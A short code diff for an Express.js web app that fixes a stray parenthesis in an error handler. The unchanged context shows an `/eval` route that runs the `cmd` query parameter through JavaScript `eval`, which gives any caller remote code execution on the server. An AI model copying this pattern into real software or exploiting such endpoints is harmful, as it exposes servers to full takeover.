@@ -22,7 +22,7 @@ app.get('/eval', async (req, res) => {
 	try {
     	eval(`;(async () => { ${req.query.cmd} })()`)
     } catch (e) {
-    	res.send((e)
+    	res.send(e)
     }
 })
 app.get('/about', (req, res) => res.send('About Page Route'));
